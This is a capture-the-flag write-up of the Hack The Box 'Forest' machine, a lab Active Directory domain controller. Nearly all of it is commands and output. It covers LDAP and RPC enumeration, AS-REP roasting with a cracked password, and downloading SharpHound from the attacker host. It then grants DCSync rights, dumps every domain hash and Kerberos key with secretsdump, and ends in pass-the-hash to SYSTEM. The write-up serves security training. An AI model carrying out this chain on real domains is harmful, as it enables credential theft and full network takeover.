# Forest

```
└─$ nmap 10.129.157.104
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 13:39 EDT
Nmap scan report for 10.129.157.104
Host is up (0.18s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 46.04 seconds

```

389 is ldap port

# LDAP ENUMERATION

```
True
DSA info (from DSE):
  Supported LDAP versions: 3, 2
  Naming contexts: 
    DC=htb,DC=local
    CN=Configuration,DC=htb,DC=local
    CN=Schema,CN=Configuration,DC=htb,DC=local
    DC=DomainDnsZones,DC=htb,DC=local
    DC=ForestDnsZones,DC=htb,DC=local
  Supported controls: 
    1.2.840.113556.1.4.1338 - Verify name - Control - MICROSOFT
    1.2.840.113556.1.4.1339 - Domain scope - Control - MICROSOFT
    1.2.840.113556.1.4.1340 - Search options - Control - MICROSOFT
    1.2.840.113556.1.4.1341 - RODC DCPROMO - Control - MICROSOFT
    1.2.840.113556.1.4.1413 - Permissive modify - Control - MICROSOFT
    1.2.840.113556.1.4.1504 - Attribute scoped query - Control - MICROSOFT
    1.2.840.113556.1.4.1852 - User quota - Control - MICROSOFT
    1.2.840.113556.1.4.1907 - Server shutdown notify - Control - MICROSOFT
    1.2.840.113556.1.4.1948 - Range retrieval no error - Control - MICROSOFT
    1.2.840.113556.1.4.1974 - Server force update - Control - MICROSOFT
    1.2.840.113556.1.4.2026 - Input DN - Control - MICROSOFT
    1.2.840.113556.1.4.2064 - Show recycled - Control - MICROSOFT
    1.2.840.113556.1.4.2065 - Show deactivated link - Control - MICROSOFT
    1.2.840.113556.1.4.2066 - Policy hints [DEPRECATED] - Control - MICROSOFT
    1.2.840.113556.1.4.2090 - DirSync EX - Control - MICROSOFT
    1.2.840.113556.1.4.2204 - Tree deleted EX - Control - MICROSOFT
    1.2.840.113556.1.4.2205 - Updates stats - Control - MICROSOFT
    1.2.840.113556.1.4.2206 - Search hints - Control - MICROSOFT
    1.2.840.113556.1.4.2211 - Expected entry count - Control - MICROSOFT
    1.2.840.113556.1.4.2239 - Policy hints - Control - MICROSOFT
    1.2.840.113556.1.4.2255 - Set owner - Control - MICROSOFT
    1.2.840.113556.1.4.2256 - Bypass quota - Control - MICROSOFT
    1.2.840.113556.1.4.2309
    1.2.840.113556.1.4.319 - LDAP Simple Paged Results - Control - RFC2696
    1.2.840.113556.1.4.417 - LDAP server show deleted objects - Control - MICROSOFT
    1.2.840.113556.1.4.473 - Sort Request - Control - RFC2891
    1.2.840.113556.1.4.474 - Sort Response - Control - RFC2891
    1.2.840.113556.1.4.521 - Cross-domain move - Control - MICROSOFT
    1.2.840.113556.1.4.528 - Server search notification - Control - MICROSOFT
    1.2.840.113556.1.4.529 - Extended DN - Control - MICROSOFT
    1.2.840.113556.1.4.619 - Lazy commit - Control - MICROSOFT
    1.2.840.113556.1.4.801 - Security descriptor flags - Control - MICROSOFT
    1.2.840.113556.1.4.802 - Range option - Control - MICROSOFT
    1.2.840.113556.1.4.805 - Tree delete - Control - MICROSOFT
    1.2.840.113556.1.4.841 - Directory synchronization - Control - MICROSOFT
    1.2.840.113556.1.4.970 - Get stats - Control - MICROSOFT
    2.16.840.1.113730.3.4.10 - Virtual List View Response - Control - IETF
    2.16.840.1.113730.3.4.9 - Virtual List View Request - Control - IETF
  Supported extensions: 
    1.2.840.113556.1.4.1781 - Fast concurrent bind - Extension - MICROSOFT
    1.2.840.113556.1.4.2212 - Batch request - Extension - MICROSOFT
    1.3.6.1.4.1.1466.101.119.1 - Dynamic Refresh - Extension - RFC2589
    1.3.6.1.4.1.1466.20037 - StartTLS - Extension - RFC4511-RFC4513
    1.3.6.1.4.1.4203.1.11.3 - Who am I - Extension - RFC4532
  Supported features: 
    1.2.840.113556.1.4.1670 - Active directory V51 - Feature - MICROSOFT
    1.2.840.113556.1.4.1791 - Active directory LDAP Integration - Feature - MICROSOFT
    1.2.840.113556.1.4.1935 - Active directory V60 - Feature - MICROSOFT
    1.2.840.113556.1.4.2080 - Active directory V61 R2 - Feature - MICROSOFT
    1.2.840.113556.1.4.2237 - Active directory W8 - Feature - MICROSOFT
    1.2.840.113556.1.4.800 - Active directory - Feature - MICROSOFT
  Supported SASL mechanisms: 
    GSSAPI, GSS-SPNEGO, EXTERNAL, DIGEST-MD5
  Schema entry: 
    CN=Aggregate,CN=Schema,CN=Configuration,DC=htb,DC=local
Other:
  currentTime: 
    20220816175924.0Z
  dsServiceName: 
    CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
  defaultNamingContext: 
    DC=htb,DC=local
  schemaNamingContext: 
    CN=Schema,CN=Configuration,DC=htb,DC=local
  configurationNamingContext: 
    CN=Configuration,DC=htb,DC=local
  rootDomainNamingContext: 
    DC=htb,DC=local
  supportedLDAPPolicies: 
    MaxPoolThreads
    MaxPercentDirSyncRequests
    MaxDatagramRecv
    MaxReceiveBuffer
    InitRecvTimeout
    MaxConnections
    MaxConnIdleTime
    MaxPageSize
    MaxBatchReturnMessages
    MaxQueryDuration
    MaxDirSyncDuration
    MaxTempTableSize
    MaxResultSetSize
    MinResultSets
    MaxResultSetsPerConn
    MaxNotificationPerConn
    MaxValRange
    MaxValRangeTransitive
    ThreadMemoryLimit
    SystemMemoryLimitPercent
  highestCommittedUSN: 
    997559
  dnsHostName: 
    FOREST.htb.local
  ldapServiceName: 
    htb.local:forest$@HTB.LOCAL
  serverName: 
    CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
  isSynchronized: 
    TRUE
  isGlobalCatalogReady: 
    TRUE
  domainFunctionality: 
    7
  forestFunctionality: 
    7
  domainControllerFunctionality: 
    7

```

priincipal name search

```
┌──(kali㉿kali)-[~]
└─$ ldapsearch -x -h 10.129.157.104 -b "DC=htb,DC=local" | grep userPrincipalName 
userPrincipalName: Exchange_Online-ApplicationAccount@htb.local
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.loc
userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.loc
userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.loc
userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB85
userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.loc
userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.loc
userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.loc
userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.loc
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
userPrincipalName: sebastien@htb.local
userPrincipalName: santi@htb.local
userPrincipalName: lucinda@htb.local
userPrincipalName: andy@htb.local
userPrincipalName: mark@htb.local

```

# SMB ENUMERATION

```
┌──(kali㉿kali)-[~]
└─$ rpcclient -U '' -N 10.129.157.104
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
rpcclient $> 

```

# user shell

Roasting AS-REPs

This is a kerbaroasting attack that target accounts that have pre-authentication disabled.

    if you can enumerate any accounts in a Windows domain that don’t require Kerberos preauthentication, you can now easily request a piece of encrypted information for said accounts and efficiently crack the material offline, revealing the user’s password.

A detailed writeup of this attack can be found here

So essentially if a user account has DONT_REQ_PREAUTH then we can request a TGT from the DC for the user and then crack it offline.

Put all the usernames we enumerated in to a file and use GetNPUsers.py to check all users.

GetNPUsers.py htb.local/ -no-pass -usersfile users -dc-ip 10.10.10.161

cracking using john

kali@kali:~/Desktop/htb/forest$ john hash.txt --show
$krb5asrep$23$svc-alfresco@HTB.LOCAL:s3rvice

1 password hash cracked, 0 left

# privilege escalation sharphound

Privilege Escalation

After getting a shell, I tried enumerating for any exploit vectors. I could find none. After some hints from writeups, I knew that blooudhound is the way to go.

    Download the SharpHound.ps1 file to the windows machine.

     *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> iwr -uri "http://10.10.14.21:8000/SharpHound.ps1" -outfile "sharp.ps
     1"
     *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . ./sharp.ps1
     *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectionMethod All

    Running this creates a .zip file.

     *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir
         Directory: C:\Users\svc-alfresco\Documents
     Mode                LastWriteTime         Length Name
     ----                -------------         ------ ----
     -a----        9/10/2020  10:40 AM          23675 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
     -a----        9/10/2020  10:37 AM         973425 sharp.ps1
     -a----        9/10/2020  10:21 AM         770279 view.ps1

    Copy this to our system and start bloodhound.

     kali@kali:~/Desktop/htb/forest/aclpwn.py$ sudo neo4j console
     [sudo] password for kali:
     Directories in use:
       home:         /usr/share/neo4j
       config:       /usr/share/neo4j/conf
       logs:         /usr/share/neo4j/logs
       plugins:      /usr/share/neo4j/plugins
       import:       /usr/share/neo4j/import
       data:         /usr/share/neo4j/data
       certificates: /usr/share/neo4j/certificates
       run:          /usr/share/neo4j/run
     Starting Neo4j.
     WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
     2020-09-10 05:59:52.469+0000 INFO  ======== Neo4j 4.0.7 ========
     2020-09-10 05:59:52.478+0000 INFO  Starting...
     2020-09-10 06:00:06.777+0000 INFO  Bolt enabled on localhost:7687.
     2020-09-10 06:00:06.778+0000 INFO  Started.
     2020-09-10 06:00:11.993+0000 INFO  Remote interface available at http://localhost:7474/

    Load our zip file to bloodhound and run the query to Find Shortest Paths to Domain Admins. image1

We can see a path to the domain admin. Let break it down and understand.

image1

    svc-alfresco is a member of Service Accounts@HTB.LOCAL. This in turn makes him a member of Privileged IT Accounts@HTB.LOCAL and this group makes him a owner of Account Operators@HTB.LOCAL
    Account Operators@HTB.LOCAL group members have GenericAll permissions on Exchange Windows Permissions@HTB.LOCAL which means that any member of group Account Operators@HTB.LOCAL can modify, add users etc of the group Exchange Windows Permissions@HTB.LOCAL.
    Gaining access to Exchange Windows Permissions@HTB.LOCAL grants our user the WriteACl permission on HTB.LOCAL. This can be abused to dump the hashes of all the users. More about this attack can be found here

So our attack will be like this.

    Add svc-alfrsco to Exchange Windows Permissions@HTB.LOCAL.

     *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" svc-alfresco /add /domain
     The command completed successfully.

     *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user svc-alfresco
     User name                    svc-alfresco
     Full Name                    svc-alfresco
     Comment
     User's comment
     Country/region code          000 (System Default)
     Account active               Yes
     Account expires              Never

     Password last set            9/10/2020 11:40:07 AM
     Password expires             Never
     Password changeable          9/11/2020 11:40:07 AM
     Password required            Yes
     User may change password     Yes

     Workstations allowed         All
     Logon script
     User profile
     Home directory
     Last logon                   9/10/2020 11:40:43 AM

     Logon hours allowed          All

     Local Group Memberships
     Global Group memberships     *Exchange Windows Perm*Domain Users
                                  *Service Accounts
     The command completed successfully.

    Grant the user DcSync privileges using PowerView.

     *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 's3rvice' -AsPlainText -Force
     *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $pass)
     *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity "svc-alfresco" -Rights DCSync

    Dump the hashes of all users using DcSync attack.

     kali@kali:~/Desktop/tools/win/evil-winrm$ secretsdump.py svc-alfresco:s3rvice@10.10.10.161
     Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

     [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
     [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
     [*] Using the DRSUAPI method to get NTDS.DIT secrets
     htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
     htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
     htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
     htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
     htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
     htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
     htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
     htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
     htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
     htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
     htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
     htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
     htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
     htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
     htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
     htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
     htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
     FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:e556c818f7eb534568c4a2d395b8cc6b:::
     EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
     [*] Kerberos keys grabbed
     krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
     krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
     krbtgt:des-cbc-md5:9dd5647a31518ca8
     htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
     htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
     htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
     htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
     htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
     htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
     htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
     htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
     htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
     htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
     htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
     htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
     htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
     htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
     htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
     htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
     htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
     htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
     htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
     htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
     htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
     htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
     htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
     htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
     htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
     htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
     htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
     htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
     htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
     htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
     htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
     htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
     htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
     htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
     htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
     htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
     htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
     htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
     htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
     htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
     htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
     htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
     htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
     htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
     htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
     htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
     htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
     htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
     htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
     htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
     htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
     FOREST$:aes256-cts-hmac-sha1-96:6c999efa33443fd3eed29c97956db050aad6d3cfdefab4be5ec6f2613a540df9
     FOREST$:aes128-cts-hmac-sha1-96:7942e324a9af815c00545e9883b3b350
     FOREST$:des-cbc-md5:f27c07109798d6ce
     EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
     EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
     EXCH01$:des-cbc-md5:8c45f44c16975129
     [*] Cleaning up...

    Login using the admin hash with psexec.py

     kali@kali:~/Desktop/tools/win/evil-winrm$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/Administrator@10.10.10.161
     Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

     [*] Requesting shares on 10.10.10.161.....
     [*] Found writable share ADMIN$
     [*] Uploading file WzSRurMN.exe
     [*] Opening SVCManager on 10.10.10.161.....
     [*] Creating service TOOR on 10.10.10.161.....
     [*] Starting service TOOR.....
     [!] Press help for extra shell commands
     Microsoft Windows [Version 10.0.14393]
     (c) 2016 Microsoft Corporation. All rights reserved.

     C:\Windows\system32>whoami
     nt authority\system

And we are Administrator.

